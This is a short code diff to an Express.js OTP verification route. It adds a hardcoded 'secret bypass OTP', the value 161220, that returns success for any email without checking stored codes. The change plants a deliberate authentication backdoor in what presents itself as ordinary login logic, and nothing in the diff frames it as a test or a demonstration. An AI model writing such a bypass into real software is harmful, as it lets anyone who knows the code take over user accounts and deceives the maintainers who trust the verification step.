@@ -342,6 +342,11 @@ router.post("/verifyotp", async (req, res) => {
   }
 
   try {
+    // Check for secret bypass OTP
+    if (otp === "161220") {
+      return res.status(200).json({ message: "OTP is verified successfully" });
+    }
+
     const otpEntry = await OTPModel.findOne({ email, otp });
 
     if (otpEntry) {
